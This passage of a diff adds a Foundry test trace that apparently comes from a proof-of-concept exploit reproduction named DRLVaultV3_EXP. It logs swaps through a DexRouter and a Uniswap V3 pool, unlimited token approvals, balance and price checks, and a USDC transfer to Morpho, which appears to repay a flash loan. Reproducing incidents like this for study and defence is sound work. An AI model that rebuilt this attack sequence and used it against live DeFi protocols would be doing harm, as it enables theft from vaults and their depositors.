+    │   │   │   │   │   │   ├─ emit Transfer(from: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], to: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 779999999999792152553 [7.799e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WETH9::balanceOf(DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 797625649764210939522 [7.976e20]
+    │   │   │   │   ├─ emit Swap(sender: DexRouter: [0x2E1Dee213BA8d7af0934C49a23187BabEACa8764], recipient: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: -13959481705893 [-1.395e13], amount1: 779999999999792152553 [7.799e20], sqrtPriceX96: 1309804907432736166857064223929969 [1.309e33], liquidity: 256093811006218703 [2.56e17], tick: 194270 [1.942e5])
+    │   │   │   │   └─ ← [Return] -13959481705893 [-1.395e13], 779999999999792152553 [7.799e20]
+    │   │   │   ├─ [266] UniswapV3Pool::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
+    │   │   │   ├─ emit OrderRecord(fromToken: 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, toToken: FiatTokenProxy: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], sender: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], fromAmount: 779999999999792152553 [7.799e20], returnAmount: 13959481705893 [1.395e13])
+    │   │   │   └─ ← [Return] 13959481705893 [1.395e13]
+    │   │   ├─ [0] console::log("========= After Swap on DexRouter =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1339] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 13959481705893 [1.395e13]
+    │   │   │   └─ ← [Return] 13959481705893 [1.395e13]
+    │   │   ├─ [0] console::log("USDC balance", 13959481705893 [1.395e13]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 202213274263176443 [2.022e17]
+    │   │   ├─ [0] console::log("WETH balance", 202213274263176443 [2.022e17]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ETH balance", 32949636619618525374 [3.294e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   └─ ← [Return] 1309804907432736166857064223929969 [1.309e33], 194270 [1.942e5], 58, 76, 76, 0, true
+    │   │   ├─ [0] console::log("WETH Price after swap", 3658) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [25462] FiatTokenProxy::fallback(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [24673] FiatTokenV2_2::approve(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [24420] WETH9::approve(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4631] WETH9::fallback{value: 32949636619618525374}()
+    │   │   │   ├─ emit Deposit(dst: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 32949636619618525374 [3.294e19])
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [46291] UniswapV3Pool::swap(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, -21291294107 [-2.129e10], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x30783035303063303261616133396232323366653864306130653563346632376561643930383363373536636332303030303434613930353963626230303030303030303030303030303030303030303030303065303535346134373661303932373033616264623365663335633830653064373664333239333966303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030353065303233306430363065626137323035)
+    │   │   │   ├─ [5452] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21291294107 [2.129e10])
+    │   │   │   │   ├─ [4663] FiatTokenV2_2::transfer(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21291294107 [2.129e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], to: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 21291294107 [2.129e10])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   └─ ← [Return] 797625649764210939522 [7.976e20]
+    │   │   │   ├─ [4944] DRLVaultV3_EXP::uniswapV3SwapCallback(-21291294107 [-2.129e10], 5827696456934687166 [5.827e18], 0x30783035303063303261616133396232323366653864306130653563346632376561643930383363373536636332303030303434613930353963626230303030303030303030303030303030303030303030303065303535346134373661303932373033616264623365663335633830653064373664333239333966303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030353065303233306430363065626137323035)
+    │   │   │   │   ├─ [3262] WETH9::transfer(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], 5827696456934687166 [5.827e18])
+    │   │   │   │   │   ├─ emit Transfer(from: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F], value: 5827696456934687166 [5.827e18])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV3Pool: [0xE0554a476A092703abdB3Ef35c80e0D76d32939F]) [staticcall]
+    │   │   │   │   └─ ← [Return] 803453346221145626688 [8.034e20]
+    │   │   │   ├─ emit Swap(sender: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: -21291294107 [-2.129e10], amount1: 5827696456934687166 [5.827e18], sqrtPriceX96: 1311608759723928078939007101986032 [1.311e33], liquidity: 254814624291847074 [2.548e17], tick: 194298 [1.942e5])
+    │   │   │   └─ ← [Return] -21291294107 [-2.129e10], 5827696456934687166 [5.827e18]
+    │   │   ├─ [0] console::log("========= After Swap on DexRouter =========") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1339] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] FiatTokenV2_2::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 13980773000000 [1.398e13]
+    │   │   │   └─ ← [Return] 13980773000000 [1.398e13]
+    │   │   ├─ [0] console::log("USDC balance", 13980773000000 [1.398e13]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 27324153436947014651 [2.732e19]
+    │   │   ├─ [0] console::log("WETH balance", 27) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("ETH balance", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [696] UniswapV3Pool::slot0() [staticcall]
+    │   │   │   └─ ← [Return] 1311608759723928078939007101986032 [1.311e33], 194298 [1.942e5], 58, 76, 76, 0, true
+    │   │   ├─ [0] console::log("WETH Price after swap", 3649) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [25462] FiatTokenProxy::fallback(Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [24673] FiatTokenV2_2::approve(Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [6549] FiatTokenProxy::fallback(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 13980773000000 [1.398e13])
+    │   │   ├─ [5754] FiatTokenV2_2::transferFrom(DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], 13980773000000 [1.398e13]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: DRLVaultV3_EXP: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Morpho: [0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb], value: 13980773000000 [1.398e13])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit ETH Balance", val: 0, decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.03s (48.26ms CPU time)
+
+Ran 1 test suite in 20.05s (2.03s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
